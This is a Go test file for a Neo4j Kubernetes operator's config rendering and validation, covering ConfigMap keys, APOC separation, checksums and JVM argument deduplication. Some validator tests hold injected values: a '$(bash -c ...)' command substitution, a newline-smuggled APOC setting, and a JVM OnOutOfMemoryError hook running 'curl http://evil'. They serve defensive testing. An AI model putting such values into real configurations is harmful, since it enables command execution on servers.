package serverconfig

import (
	"strings"
	"testing"

	neo4jv1beta1 "github.com/neo4j/neo4j-kubernetes-operator/src/api/v1beta1"
	"github.com/neo4j/neo4j-kubernetes-operator/src/internal/render"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func TestConfigMapRendersNeo4jKeys(t *testing.T) {
	neo4j := &neo4jv1beta1.Neo4j{
		ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
		Spec: neo4jv1beta1.Neo4jSpec{
			Config: &neo4jv1beta1.ConfigSpec{
				Neo4j: map[string]string{
					"db.transaction.timeout":                 "42s",
					"dbms.security.auth_max_failed_attempts": "5",
				},
			},
		},
	}
	data := ConfigMap(render.StandaloneContext(neo4j)).Data
	for key, want := range map[string]string{
		"db.transaction.timeout":                 "42s",
		"dbms.security.auth_max_failed_attempts": "5",
	} {
		if data[key] != want {
			t.Fatalf("config key %q = %q, want %q", key, data[key], want)
		}
	}
	if _, ok := data["neo4j.conf"]; ok {
		t.Fatal("config must use per-setting keys, not a neo4j.conf blob")
	}
}

func TestConfigMapRendersApocOnlyWhenAssigned(t *testing.T) {
	neo4j := &neo4jv1beta1.Neo4j{
		ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
		Spec: neo4jv1beta1.Neo4jSpec{
			Topology: neo4jv1beta1.TopologySpec{Mode: neo4jv1beta1.TopologyModeStandalone},
			Config: &neo4jv1beta1.ConfigSpec{
				Apoc: map[string]string{"apoc.trigger.enabled": "true"},
			},
		},
	}
	if ApocConfigMap(render.StandaloneContext(neo4j)) != nil {
		t.Fatal("apoc ConfigMap should not render without plugins: [apoc]")
	}

	neo4j.Spec.Plugins = []string{"apoc"}
	apocCM := ApocConfigMap(render.StandaloneContext(neo4j))
	if apocCM == nil || apocCM.Data["apoc.conf"] == "" {
		t.Fatal("expected apoc.conf when apoc plugin is assigned")
	}
}

func TestValidateConfigRejectsNeo4jKeysInApoc(t *testing.T) {
	neo4j := &neo4jv1beta1.Neo4j{
		Spec: neo4jv1beta1.Neo4jSpec{
			Config: &neo4jv1beta1.ConfigSpec{
				Apoc: map[string]string{
					"apoc.trigger.enabled":                  "true",
					"dbms.security.procedures.unrestricted": "apoc.*",
				},
			},
		},
	}
	if err := ValidateConfig(neo4j); err == nil {
		t.Fatal("expected error for dbms.* under config.apoc")
	}
}

func TestValidateConfigRejectsExpandCommands(t *testing.T) {
	neo4j := &neo4jv1beta1.Neo4j{
		Spec: neo4jv1beta1.Neo4jSpec{
			Config: &neo4jv1beta1.ConfigSpec{
				Neo4j: map[string]string{
					"server.memory.heap.initial_size": "$(bash -c 'id')512m",
				},
			},
		},
	}
	err := ValidateConfig(neo4j)
	if err == nil || !strings.Contains(err.Error(), "command substitution") {
		t.Fatalf("got %v", err)
	}
}

func TestValidateConfigRejectsApocNewline(t *testing.T) {
	neo4j := &neo4jv1beta1.Neo4j{
		Spec: neo4jv1beta1.Neo4jSpec{
			Config: &neo4jv1beta1.ConfigSpec{
				Apoc: map[string]string{
					"apoc.import.file.enabled": "true\napoc.import.file.use_neo4j_config=false",
				},
			},
		},
	}
	err := ValidateConfig(neo4j)
	if err == nil || !strings.Contains(err.Error(), "newlines") {
		t.Fatalf("got %v", err)
	}
}

func TestValidateConfigRejectsDangerousJVM(t *testing.T) {
	neo4j := &neo4jv1beta1.Neo4j{
		Spec: neo4jv1beta1.Neo4jSpec{
			Config: &neo4jv1beta1.ConfigSpec{
				JVM: &neo4jv1beta1.JVMSpec{
					AdditionalArguments: []string{
						"-XX:OnOutOfMemoryError=curl http://evil",
					},
				},
			},
		},
	}
	err := ValidateConfig(neo4j)
	if err == nil || !strings.Contains(err.Error(), "not allowed") {
		t.Fatalf("got %v", err)
	}
}

func TestValidateConfigAllowsSafeSettings(t *testing.T) {
	use := true
	neo4j := &neo4jv1beta1.Neo4j{
		Spec: neo4jv1beta1.Neo4jSpec{
			Config: &neo4jv1beta1.ConfigSpec{
				Neo4j: map[string]string{"db.transaction.timeout": "30s"},
				Apoc:  map[string]string{"apoc.trigger.enabled": "true"},
				JVM: &neo4jv1beta1.JVMSpec{
					UseDefaults:         &use,
					AdditionalArguments: []string{"-XX:+ExitOnOutOfMemoryError"},
				},
			},
			Connectivity: &neo4jv1beta1.ConnectivitySpec{ClusterDomain: "cluster.local"},
		},
	}
	if err := ValidateConfig(neo4j); err != nil {
		t.Fatal(err)
	}
}

func TestRenderApocConfSkipsNonApocKeys(t *testing.T) {
	neo4j := &neo4jv1beta1.Neo4j{
		ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
		Spec: neo4jv1beta1.Neo4jSpec{
			Topology: neo4jv1beta1.TopologySpec{Mode: neo4jv1beta1.TopologyModeStandalone},
			Plugins:  []string{"apoc"},
			Config: &neo4jv1beta1.ConfigSpec{
				Apoc: map[string]string{
					"apoc.trigger.enabled":                  "true",
					"dbms.security.procedures.unrestricted": "apoc.*",
				},
			},
		},
	}
	body := renderApocConf(render.StandaloneContext(neo4j))
	if !strings.Contains(body, "apoc.trigger.enabled=true") {
		t.Fatalf("missing apoc key: %q", body)
	}
	if strings.Contains(body, "dbms.security") {
		t.Fatalf("dbms.security must not appear in apoc.conf: %q", body)
	}
}

func TestConfigChecksumChangesWithSpec(t *testing.T) {
	base := &neo4jv1beta1.Neo4j{
		ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
		Spec: neo4jv1beta1.Neo4jSpec{
			Config: &neo4jv1beta1.ConfigSpec{
				Neo4j: map[string]string{"db.transaction.timeout": "42s"},
			},
		},
	}
	updated := base.DeepCopy()
	updated.Spec.Config.Neo4j["dbms.security.auth_max_failed_attempts"] = "5"

	before := ConfigChecksum(render.StandaloneContext(base))
	after := ConfigChecksum(render.StandaloneContext(updated))
	if before == after {
		t.Fatalf("checksum should change when spec.config.neo4j changes")
	}
	if before == "" || after == "" {
		t.Fatalf("checksum must not be empty")
	}
}

func TestConfigMapRendersJVMDefaults(t *testing.T) {
	trueVal, falseVal := true, false
	cases := []struct {
		name    string
		jvm     *neo4jv1beta1.JVMSpec
		wantKey bool
		wantIn  []string
		wantOut []string
	}{
		{
			name:    "nil jvm uses defaults",
			jvm:     nil,
			wantKey: true,
			wantIn:  []string{"-XX:+UseG1GC", "-Dlog4j2.disable.jmx=true"},
		},
		{
			name:    "useDefaults true alone",
			jvm:     &neo4jv1beta1.JVMSpec{UseDefaults: &trueVal},
			wantKey: true,
			wantIn:  []string{"-XX:+UseG1GC"},
		},
		{
			name: "defaults then additionalArguments",
			jvm: &neo4jv1beta1.JVMSpec{
				UseDefaults:         &trueVal,
				AdditionalArguments: []string{"-XX:+ExitOnOutOfMemoryError"},
			},
			wantKey: true,
			wantIn:  []string{"-XX:+UseG1GC", "-XX:+ExitOnOutOfMemoryError"},
		},
		{
			name: "same key overrides default in place",
			jvm: &neo4jv1beta1.JVMSpec{
				UseDefaults: &trueVal,
				AdditionalArguments: []string{
					"-XX:MaxMetaspaceSize=1024m",
					"-XX:-OmitStackTraceInFastThrow",
					"-Djdk.nio.maxCachedBufferSize=1024",
					"-Djdk.nio.maxCachedBufferSize=1026",
					"-XX:-OmitStackTraceInFastThrow",
				},
			},
			wantKey: true,
			wantIn: []string{
				"-XX:-OmitStackTraceInFastThrow",
				"-Djdk.nio.maxCachedBufferSize=1026",
				"-XX:MaxMetaspaceSize=1024m",
			},
			wantOut: []string{"-Djdk.nio.maxCachedBufferSize=1024"},
		},
		{
			name: "useDefaults false only additional",
			jvm: &neo4jv1beta1.JVMSpec{
				UseDefaults:         &falseVal,
				AdditionalArguments: []string{"-XX:MaxMetaspaceSize=1024m"},
			},
			wantKey: true,
			wantIn:  []string{"-XX:MaxMetaspaceSize=1024m"},
			wantOut: []string{"-XX:+UseG1GC"},
		},
		{
			name:    "useDefaults false empty args omits key",
			jvm:     &neo4jv1beta1.JVMSpec{UseDefaults: &falseVal},
			wantKey: false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			neo4j := &neo4jv1beta1.Neo4j{
				ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
				Spec: neo4jv1beta1.Neo4jSpec{
					Config: &neo4jv1beta1.ConfigSpec{JVM: tc.jvm},
				},
			}
			data := ConfigMap(render.StandaloneContext(neo4j)).Data
			got, ok := data["server.jvm.additional"]
			if ok != tc.wantKey {
				t.Fatalf("server.jvm.additional present=%v, want %v (value=%q)", ok, tc.wantKey, got)
			}
			for _, s := range tc.wantIn {
				if !strings.Contains(got, s) {
					t.Fatalf("server.jvm.additional missing %q:\n%s", s, got)
				}
			}
			for _, s := range tc.wantOut {
				if strings.Contains(got, s) {
					t.Fatalf("server.jvm.additional unexpectedly contains %q:\n%s", s, got)
				}
			}
			if tc.name == "same key overrides default in place" {
				if n := strings.Count(got, "-XX:-OmitStackTraceInFastThrow"); n != 1 {
					t.Fatalf("expected OmitStackTrace once, got %d:\n%s", n, got)
				}
				if n := strings.Count(got, "maxCachedBufferSize"); n != 1 {
					t.Fatalf("expected maxCachedBufferSize once, got %d:\n%s", n, got)
				}
				// New keys append after defaults; overrides keep default position.
				meta := strings.Index(got, "-XX:MaxMetaspaceSize=1024m")
				buf := strings.Index(got, "-Djdk.nio.maxCachedBufferSize=1026")
				if meta < 0 || buf < 0 || !(buf < meta) {
					t.Fatalf("override should keep default position before new keys:\n%s", got)
				}
			}
		})
	}
}

func TestDuplicatesReportsDroppedJVMArguments(t *testing.T) {
	trueVal, falseVal := true, false
	cases := []struct {
		name string
		jvm  *neo4jv1beta1.JVMSpec
		want []render.Duplicate
	}{
		{name: "no jvm spec", jvm: nil},
		{
			name: "additional argument without collision",
			jvm:  &neo4jv1beta1.JVMSpec{UseDefaults: &trueVal, AdditionalArguments: []string{"-XX:+ExitOnOutOfMemoryError"}},
		},
		{
			name: "exact repeat loses nothing",
			jvm: &neo4jv1beta1.JVMSpec{UseDefaults: &falseVal, AdditionalArguments: []string{
				"-XX:MaxMetaspaceSize=1024m", "-XX:MaxMetaspaceSize=1024m",
			}},
		},
		{
			name: "useDefaults false ignores the defaults",
			jvm: &neo4jv1beta1.JVMSpec{UseDefaults: &falseVal, AdditionalArguments: []string{
				"-Djdk.nio.maxCachedBufferSize=2048",
			}},
		},
		{
			name: "user value replaces a Neo4j default",
			jvm: &neo4jv1beta1.JVMSpec{UseDefaults: &trueVal, AdditionalArguments: []string{
				"-Djdk.nio.maxCachedBufferSize=2048",
			}},
			want: []render.Duplicate{{
				Field:       FieldJVMArguments,
				Key:         "-Djdk.nio.maxCachedBufferSize",
				Kept:        "-Djdk.nio.maxCachedBufferSize=2048",
				KeptFrom:    render.OriginUser,
				Dropped:     "-Djdk.nio.maxCachedBufferSize=1024",
				DroppedFrom: render.OriginNeo4jDefault,
			}},
		},
		{
			name: "boolean flip of a Neo4j default",
			jvm: &neo4jv1beta1.JVMSpec{UseDefaults: &trueVal, AdditionalArguments: []string{
				"-XX:+OmitStackTraceInFastThrow",
			}},
			want: []render.Duplicate{{
				Field:       FieldJVMArguments,
				Key:         "-XX:OmitStackTraceInFastThrow",
				Kept:        "-XX:+OmitStackTraceInFastThrow",
				KeptFrom:    render.OriginUser,
				Dropped:     "-XX:-OmitStackTraceInFastThrow",
				DroppedFrom: render.OriginNeo4jDefault,
			}},
		},
		{
			name: "same key twice in additionalArguments",
			jvm: &neo4jv1beta1.JVMSpec{UseDefaults: &falseVal, AdditionalArguments: []string{
				"-XX:MaxMetaspaceSize=1024m", "-XX:MaxMetaspaceSize=2048m",
			}},
			want: []render.Duplicate{{
				Field:       FieldJVMArguments,
				Key:         "-XX:MaxMetaspaceSize",
				Kept:        "-XX:MaxMetaspaceSize=2048m",
				KeptFrom:    render.OriginUser,
				Dropped:     "-XX:MaxMetaspaceSize=1024m",
				DroppedFrom: render.OriginUser,
			}},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			neo4j := &neo4jv1beta1.Neo4j{
				ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
				Spec:       neo4jv1beta1.Neo4jSpec{Config: &neo4jv1beta1.ConfigSpec{JVM: tc.jvm}},
			}
			got := Duplicates(neo4j)
			if len(got) != len(tc.want) {
				t.Fatalf("got %d duplicate(s) %+v, want %d", len(got), got, len(tc.want))
			}
			for i := range tc.want {
				if got[i] != tc.want[i] {
					t.Errorf("duplicate %d = %+v, want %+v", i, got[i], tc.want[i])
				}
			}
		})
	}
}

// The same reporting covers plain conf keys, so a user setting is never dropped in silence —
// notably when an operator-injected key wins over spec.config.neo4j.
func TestDuplicatesReportsDroppedNeo4jConfKeys(t *testing.T) {
	cases := []struct {
		name    string
		cluster bool
		conf    map[string]string
		want    []render.Duplicate
	}{
		{name: "key the operator does not touch", conf: map[string]string{"db.transaction.timeout": "60s"}},
		{
			name: "user value replaces an operator default",
			conf: map[string]string{"server.default_listen_address": "127.0.0.1"},
			want: []render.Duplicate{{
				Field:       FieldConfigNeo4j,
				Key:         "server.default_listen_address",
				Kept:        "127.0.0.1",
				KeptFrom:    render.OriginUser,
				Dropped:     "0.0.0.0",
				DroppedFrom: render.OriginOperatorDefault,
			}},
		},
		{
			// Cluster routing is operator-owned and, unlike the listener keys, no CEL rule
			// stops a user from setting it — exactly the case that used to go unnoticed.
			name:    "operator injection wins over the user",
			cluster: true,
			conf:    map[string]string{"dbms.routing.enabled": "false"},
			want: []render.Duplicate{{
				Field:       FieldConfigNeo4j,
				Key:         "dbms.routing.enabled",
				Kept:        "true",
				KeptFrom:    render.OriginOperatorInjected,
				Dropped:     "false",
				DroppedFrom: render.OriginUser,
			}},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			topology := neo4jv1beta1.TopologySpec{Mode: neo4jv1beta1.TopologyModeStandalone}
			if tc.cluster {
				topology = neo4jv1beta1.TopologySpec{
					Mode:      neo4jv1beta1.TopologyModeCluster,
					Primaries: &neo4jv1beta1.PrimariesSpec{Members: 3},
				}
			}
			neo4j := &neo4jv1beta1.Neo4j{
				ObjectMeta: metav1.ObjectMeta{Name: "dev", Namespace: "default"},
				Spec: neo4jv1beta1.Neo4jSpec{
					Topology: topology,
					Config:   &neo4jv1beta1.ConfigSpec{Neo4j: tc.conf},
				},
			}
			got := Duplicates(neo4j)
			if len(got) != len(tc.want) {
				t.Fatalf("got %d duplicate(s) %+v, want %d", len(got), got, len(tc.want))
			}
			for i := range tc.want {
				if got[i] != tc.want[i] {
					t.Errorf("duplicate %d = %+v, want %+v", i, got[i], tc.want[i])
				}
			}
		})
	}
}
